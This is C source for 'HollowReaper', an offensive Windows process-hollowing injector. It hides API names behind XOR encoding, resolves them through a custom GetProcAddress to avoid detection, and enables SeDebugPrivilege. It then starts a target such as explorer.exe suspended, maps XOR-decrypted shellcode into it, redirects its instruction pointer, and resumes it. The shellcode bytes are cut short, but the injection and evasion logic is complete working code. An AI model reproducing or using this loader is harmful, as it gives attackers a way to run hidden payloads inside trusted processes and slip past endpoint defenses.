/*
    Author: vari.sh
    Description:
       - This program implements process hollowing (it creates a suspended process,
         injects a deobfuscated shellcode via XOR, and then resumes the thread).

    Usage: HollowReaper.exe "C:\windows\explorer.exe"

*/

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>


// =====================================================
// API Deobfuscation Functions (XOR)
// =====================================================

// Function to decrypt a string (encrypted data is not null-terminated)
char* xor_decrypt_string(const unsigned char* cipher, size_t len, const char* key, size_t key_len)
{
    char* result = (char*)malloc(len + 1);
    if (!result) return NULL;
    for (size_t i = 0; i < len; i++) {
        result[i] = cipher[i] ^ key[i % key_len];
    }
    result[len] = '\0';
    return result;
}

// Function to decrypt a buffer in-place (e.g., for shellcode)
void xor_decrypt_buffer(unsigned char* buffer, size_t len, const char* key, size_t key_len)
{
    for (size_t i = 0; i < len; i++) {
        buffer[i] ^= key[i % key_len];
    }
}

// to_wide util function

wchar_t* to_wide(const char* str) {
    int len = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    if (len == 0) return NULL;
    wchar_t* wstr = (wchar_t*)malloc(len * sizeof(wchar_t));
    if (!wstr) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, str, -1, wstr, len);
    return wstr;
}

// =====================================================
// Function to load clean versions of DLLs
// =====================================================
HMODULE LoadCleanDLL(char* dllPath) {

    HMODULE hDLL = LoadLibraryA(dllPath);
    if (hDLL)
    {
        // printf("[+] Loaded clean copy of %s at: %p\n", dllPath, hDLL);
    }
    else
    {
        // printf("[ERROR] Failed to load %s. Error: %lu\n", dllPath, GetLastError());
    }

    return hDLL;
}

// =====================================================
// get_proc_address reimplementation
// =====================================================

FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    if (hModule == NULL || lpProcName == NULL) {
        printf("Invalid module handle or function name.\n");
        return NULL;
    }

    // Get the base address of the module
    BYTE* baseAddr = (BYTE*)hModule;

    // Validate the DOS header
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddr;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Invalid DOS signature.\n");
        return NULL;
    }

    // Retrieve the NT headers using the DOS header's e_lfanew field
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddr + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Invalid NT signature.\n");
        return NULL;
    }

    // Get the Export Directory from the Data Directory
    IMAGE_DATA_DIRECTORY exportDataDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDataDir.VirtualAddress == 0) {
        printf("[!] No export directory found.\n");
        return NULL;
    }

    // Get a pointer to the Export Directory
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)(baseAddr + exportDataDir.VirtualAddress);

    // Get pointers to the arrays of function addresses, names and name ordinals
    DWORD* addressOfFunctions = (DWORD*)(baseAddr + exportDir->AddressOfFunctions);
    DWORD* addressOfNames = (DWORD*)(baseAddr + exportDir->AddressOfNames);
    WORD* addressOfNameOrdinals = (WORD*)(baseAddr + exportDir->AddressOfNameOrdinals);

    // Iterate through the exported names to find the desired function
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* functionName = (char*)(baseAddr + addressOfNames[i]);
        if (_stricmp(functionName, lpProcName) == 0) {
            // Retrieve the ordinal for the found function
            WORD ordinal = addressOfNameOrdinals[i];
            // Get the RVA of the function
            DWORD functionRVA = addressOfFunctions[ordinal];
            // printf("[+] Found %s at ordinal %hu, RVA: 0x%08X\n", lpProcName, ordinal, functionRVA);
            // Return the absolute address of the function
            return (FARPROC)(baseAddr + functionRVA);
        }
    }

    printf("[!] Function %s not found.\n", lpProcName);
    return NULL;
}

// =====================================================
// API Declarations
// =====================================================

// Loading API

// "CreateProcessW"
static const unsigned char CPW_ENC[] = {
    0x73, 0x43, 0x57, 0x52, 0x40, 0x50, 0x66, 0x45, 0x57, 0x5A, 0x04, 0x11, 0x10, 0x33
};

// "ResumeThread"
static const unsigned char RT_ENC[] = {
    0x62, 0x54, 0x41, 0x46, 0x59, 0x50, 0x62, 0x5F, 0x4A, 0x5C, 0x00, 0x06
};

// "NtCreateSection"
static const unsigned char NTCS_ENC[] = {
    0x7E, 0x45, 0x71, 0x41, 0x51, 0x54, 0x42, 0x52, 0x6B, 0x5C, 0x02, 0x16, 0x0A, 0x0B, 0x0B
};

// "NtMapViewOfSection"
static const unsigned char NTMVS_ENC[] = {
    0x7E, 0x45, 0x7F, 0x52, 0x44, 0x63, 0x5F, 0x52, 0x4F, 0x76, 0x07, 0x31, 0x06, 0x07, 0x11, 0x0F, 0x08, 0x06
};

// "OpenProcessToken"
static const unsigned char OPT_ENC[] = {
    0x7F, 0x41, 0x57, 0x5D, 0x64, 0x47, 0x59, 0x54, 0x5D, 0x4A, 0x12, 0x36, 0x0C, 0x0F, 0x00, 0x08
};

// "AdjustTokenPrivileges"
static const unsigned char ATP_ENC[] = {
    0x71, 0x55, 0x58, 0x46, 0x47, 0x41, 0x62, 0x58, 0x53, 0x5C, 0x0F, 0x32, 0x11, 0x0D, 0x13, 0x0F, 0x0B, 0x0D, 0x0E, 0x0F, 0x43
};

// "LookupPrivilegeValueA"
static const unsigned char LPVA_ENC[] = {
    0x7C, 0x5E, 0x5D, 0x58, 0x41, 0x45, 0x66, 0x45, 0x51, 0x4F, 0x08, 0x0E, 0x06, 0x03, 0x00, 0x30, 0x06, 0x04, 0x1C, 0x0F, 0x71
};

// "GetThreadContext"
static const unsigned char GTC_ENC[] = {
    0x77, 0x54, 0x46, 0x67, 0x5C, 0x47, 0x53, 0x56, 0x5C, 0x7A, 0x0E, 0x0C, 0x17, 0x01, 0x1D, 0x12
};

// "SetThreadContext"
static const unsigned char STC_ENC[] = {
    0x63, 0x54, 0x46, 0x67, 0x5C, 0x47, 0x53, 0x56, 0x5C, 0x7A, 0x0E, 0x0C, 0x17, 0x01, 0x1D, 0x12
};

// "GetCurrentProcess"
static const unsigned char GCP_ENC[] = {
    0x77, 0x54, 0x46, 0x70, 0x41, 0x47, 0x44, 0x52, 0x56, 0x4D, 0x31, 0x10, 0x0C, 0x07, 0x00, 0x15, 0x14
};

typedef BOOL(WINAPI* PFN_OPT)(
    HANDLE ProcessHandle,
    DWORD DesiredAccess,
    PHANDLE TokenHandle
    );

typedef BOOL(WINAPI* PFN_ATP)(
    HANDLE TokenHandle,
    BOOL DisableAllPrivileges,
    PTOKEN_PRIVILEGES NewState,
    DWORD BufferLength,
    PTOKEN_PRIVILEGES PreviousState,
    PDWORD ReturnLength
    );

typedef BOOL(WINAPI* PFN_LPVA)(
    LPCSTR lpSystemName,
    LPCSTR lpName,
    PLUID lpLuid
    );

typedef BOOL(WINAPI* PFN_CPW)(
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    );

typedef DWORD(WINAPI* PFN_RT)(
    HANDLE hThread
    );

typedef NTSTATUS(NTAPI* PFN_NTCS)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
    );

typedef NTSTATUS(NTAPI* PFN_NTMVOS)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );

typedef BOOL(WINAPI* PFN_GTC)(
    HANDLE hThread,
    LPCONTEXT lpContext
    );

typedef BOOL(WINAPI* PFN_STC)(
    HANDLE hThread,
    const CONTEXT* lpContext
    );

typedef HANDLE(WINAPI* PFN_GCP)(
    VOID
    );

// =====================================================
// Main – Process Hollowing + LSASS EPROCESS Reading
// =====================================================
int main(int argc, char* argv[]) {
    // Start
    printf("[+] Starting HollowReaper\n");
    Sleep(5000);

    // Load clean versions of DLLs
    char* kernel32Path = "C:\\Windows\\System32\\kernel32.dll";
    HMODULE hKernel32 = LoadCleanDLL(kernel32Path);

    char* ntdllPath = "C:\\Windows\\System32\\ntdll.dll";
    HMODULE hNtdll = LoadCleanDLL(ntdllPath);

    char* advapi32Path = "C:\\Windows\\System32\\advapi32.dll";
    HMODULE hAdvapi32 = LoadCleanDLL(advapi32Path);

    if (!hKernel32 || !hNtdll || !hAdvapi32) {
        printf("[!] Failed to load one or more DLLs\n");
        return 1;
    }

    // XOR key definition
    const char* XOR_KEY = "0123456789abcdefghij";
    size_t key_len = strlen(XOR_KEY);

    // deXORing names
    char* strCPW = (char*)malloc(sizeof(CPW_ENC));
    char* strRT = (char*)malloc(sizeof(RT_ENC));
    char* strNTCS = (char*)malloc(sizeof(NTCS_ENC));
    char* strNTMVS = (char*)malloc(sizeof(NTMVS_ENC));
    char* strOPT = (char*)malloc(sizeof(OPT_ENC));
    char* strATP = (char*)malloc(sizeof(ATP_ENC));
    char* strLPVA = (char*)malloc(sizeof(LPVA_ENC));
    char* strGTC = (char*)malloc(sizeof(GTC_ENC));
    char* strSTC = (char*)malloc(sizeof(STC_ENC));
    char* strGCP = (char*)malloc(sizeof(GCP_ENC));

    if (!strCPW || !strRT || !strNTCS || !strNTMVS || !strOPT || !strATP || !strLPVA || !strGTC || !strSTC || !strGCP) {
        printf("[ERROR] Memory allocation error\n");
        return 1;
    }

    // KERNEL32.DLL APIs
    memcpy(strCPW, CPW_ENC, sizeof(CPW_ENC));
    strCPW = xor_decrypt_string((unsigned char*)strCPW, sizeof(CPW_ENC), XOR_KEY, key_len);
    PFN_CPW pCPW = (PFN_CPW)CustomGetProcAddress(hKernel32, strCPW);
    SecureZeroMemory(strCPW, sizeof(CPW_ENC)); free(strCPW);

    memcpy(strRT, RT_ENC, sizeof(RT_ENC));
    strRT = xor_decrypt_string((unsigned char*)strRT, sizeof(RT_ENC), XOR_KEY, key_len);
    PFN_RT pRT = (PFN_RT)CustomGetProcAddress(hKernel32, strRT);
    SecureZeroMemory(strRT, sizeof(RT_ENC)); free(strRT);

    // NTDLL.DLL APIs
    memcpy(strNTCS, NTCS_ENC, sizeof(NTCS_ENC));
    strNTCS = xor_decrypt_string(NTCS_ENC, sizeof(NTCS_ENC), XOR_KEY, key_len);
    PFN_NTCS pNCS = (PFN_NTCS)CustomGetProcAddress(hNtdll, strNTCS);
    SecureZeroMemory(strNTCS, sizeof(NTCS_ENC)); free(strNTCS);

    memcpy(strNTMVS, NTMVS_ENC, sizeof(NTMVS_ENC));
    strNTMVS = xor_decrypt_string(NTMVS_ENC, sizeof(NTMVS_ENC), XOR_KEY, key_len);
    PFN_NTMVOS pNMVOS = (PFN_NTMVOS)CustomGetProcAddress(hNtdll, strNTMVS);
    SecureZeroMemory(strNTMVS, sizeof(NTMVS_ENC)); free(strNTMVS);

    // ADVAPI32.DLL APIs
    memcpy(strOPT, OPT_ENC, sizeof(OPT_ENC));
    strOPT = xor_decrypt_string(OPT_ENC, sizeof(OPT_ENC), XOR_KEY, key_len);
    PFN_OPT pOPT = (PFN_OPT)CustomGetProcAddress(hAdvapi32, strOPT);
    SecureZeroMemory(strOPT, sizeof(OPT_ENC)); free(strOPT);

    memcpy(strATP, ATP_ENC, sizeof(ATP_ENC));
    strATP = xor_decrypt_string(ATP_ENC, sizeof(ATP_ENC), XOR_KEY, key_len);
    PFN_ATP pATP = (PFN_ATP)CustomGetProcAddress(hAdvapi32, strATP);
    SecureZeroMemory(strATP, sizeof(ATP_ENC)); free(strATP);

    memcpy(strLPVA, LPVA_ENC, sizeof(LPVA_ENC));
    strLPVA = xor_decrypt_string(LPVA_ENC, sizeof(LPVA_ENC), XOR_KEY, key_len);
    PFN_LPVA pLPVA = (PFN_LPVA)CustomGetProcAddress(hAdvapi32, strLPVA);
    SecureZeroMemory(strLPVA, sizeof(LPVA_ENC)); free(strLPVA);

    memcpy(strGTC, GTC_ENC, sizeof(GTC_ENC));
    strGTC = xor_decrypt_string((unsigned char*)strGTC, sizeof(GTC_ENC), XOR_KEY, key_len);
    PFN_GTC pGTC = (PFN_GTC)CustomGetProcAddress(hKernel32, strGTC);
    SecureZeroMemory(strGTC, sizeof(GTC_ENC)); free(strGTC);

    memcpy(strSTC, STC_ENC, sizeof(STC_ENC));
    strSTC = xor_decrypt_string((unsigned char*)strSTC, sizeof(STC_ENC), XOR_KEY, key_len);
    PFN_STC pSTC = (PFN_STC)CustomGetProcAddress(hKernel32, strSTC);
    SecureZeroMemory(strSTC, sizeof(STC_ENC)); free(strSTC);

    memcpy(strGCP, GCP_ENC, sizeof(GCP_ENC));
    strGCP = xor_decrypt_string((unsigned char*)strGCP, sizeof(GCP_ENC), XOR_KEY, key_len);
    PFN_GCP pGCP = (PFN_GCP)CustomGetProcAddress(hKernel32, strGCP);
    SecureZeroMemory(strGCP, sizeof(GCP_ENC)); free(strGCP);

    // Check all resolved
    if (!pCPW || !pRT || !pNCS || !pNMVOS || !pOPT || !pATP || !pLPVA) {
        printf("[ERROR] Error retrieving API addresses.\n");
        return 1;
    }


    // Enabling SeDebugPrivilege
    HANDLE hToken = NULL;
    LUID luid;
    TOKEN_PRIVILEGES tp;

    printf("[*] Requesting S DBG PVG...\n");
    if (!pOPT(pGCP(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        // printf("[!] OPT failed, error: %lu\n", GetLastError());
        return 1;
    }

    // "SeDebugPrivilege"
    static const unsigned char SEDBG_ENC[] = {
        0x63, 0x54, 0x76, 0x56, 0x56, 0x40, 0x51, 0x67, 0x4A, 0x50, 0x17, 0x0B, 0x0F, 0x01, 0x02, 0x03
    };

    char* strSEDBG = (char*)malloc(sizeof(SEDBG_ENC));
    if (!strSEDBG) {
        printf("[ERROR] Memory allocation failed for S DBG PVG\n");
        return 1;
    }
    memcpy(strSEDBG, SEDBG_ENC, sizeof(SEDBG_ENC));
    strSEDBG = xor_decrypt_string((unsigned char*)strSEDBG, sizeof(SEDBG_ENC), XOR_KEY, key_len);


    if (!pLPVA(NULL, strSEDBG, &luid)) {
        // printf("[!] LPVA failed, error: %lu\n", GetLastError());
        return 1;
    }
    tp.PrivilegeCount = 1;
    DWORD se_enabled_obfuscated = 0xA5 ^ 0xA7;  // 0x02
    tp.Privileges->Attributes = se_enabled_obfuscated;
    // tp.Privileges->Attributes = SE_PRIVILEGE_ENABLED;
    tp.Privileges->Luid = luid;
    if (!pATP(hToken, FALSE, &tp, 0, NULL, NULL)) {
        // printf("[!] ATP failed, error: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] S DBG PVG enabled.\n");

    // Obtain the target executable path (from command line or stdin)
    char exePathA[MAX_PATH] = { 0 };
    if (argc > 1) {
        strncpy(exePathA, argv[1], MAX_PATH - 1);
        printf("[+] Path provided from command line: %s\n", exePathA);
    }
    else {
        printf("[*] Enter the full path of the executable: ");
        if (!fgets(exePathA, sizeof(exePathA), stdin)) {
            printf("[ERROR] Error reading the path.\n");
            return 1;
        }
        exePathA[strcspn(exePathA, "\r\n")] = '\0';
    }
    if (strlen(exePathA) == 0) {
        printf("[ERROR] Invalid path!\n");
        return 1;
    }
    wchar_t* exePathW = to_wide(exePathA);
    if (!exePathW) {
        printf("[ERROR] Error converting the path to Unicode.\n");
        return 1;
    }

    // Create the process in a suspended state

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (!pCPW(exePathW, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        // printf("[ERROR] Error creating the process, code: %lu\n", GetLastError());
        free(exePathW);
        return 1;
    }
    free(exePathW);
    printf("[+] Process created in suspended state, PID: %lu\n", pi.dwProcessId);

    // Deobfuscate the shellcode
    unsigned char shellcode_enc[] = {
        0xD8, 0xF1, 0x45, 0x33, ...
    };
    size_t shellcode_len = sizeof(shellcode_enc);
    xor_decrypt_buffer(shellcode_enc, shellcode_len, XOR_KEY, key_len);

    // Create section
    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize = { 0 };
    sectionSize.QuadPart = shellcode_len;
    NTSTATUS status = pNCS(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (status != 0 || !hSection) {
        printf("[ERROR] NCS failed: 0x%08X\n", status);
        return 1;
    }

    // Map section to local process
    PVOID localBaseAddress = NULL;
    SIZE_T viewSize = 0;
    status = pNMVOS(hSection, pGCP(), &localBaseAddress, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);
    if (status != 0 || !localBaseAddress) {
        printf("[ERROR] NMVOS (local) failed: 0x%08X\n", status);
        return 1;
    }
    memcpy(localBaseAddress, shellcode_enc, shellcode_len);

    // Map section to remote process
    PVOID remoteBaseAddress = NULL;
    viewSize = 0;
    status = pNMVOS(hSection, pi.hProcess, &remoteBaseAddress, 0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READ);
    if (status != 0 || !remoteBaseAddress) {
        printf("[ERROR] NMVOS (remote) failed: 0x%08X\n", status);
        return 1;
    }
    printf("[+] Shellcode mapped at remote address: %p\n", remoteBaseAddress);

    // Modify RIP to point to shellcode in remote process
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_CONTROL;
    if (!pGTC(pi.hThread, &ctx)) {
        // printf("[ERROR] GTC failed: %lu\n", GetLastError());
        return 1;
    }
#ifdef _WIN64
    ctx.Rip = (DWORD64)remoteBaseAddress;
#else
    ctx.Eip = (DWORD)remoteBaseAddress;
#endif
    if (!pSTC(pi.hThread, &ctx)) {
        // printf("[ERROR] STC failed: %lu\n", GetLastError());
        return 1;
    }

    DWORD suspendCount = pRT(pi.hThread);
    printf("[+] Thread resumed, suspend count: %lu\n", suspendCount);

    // Cleanup: close handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    printf("[+] Operation completed.\n");
    return 0;
}
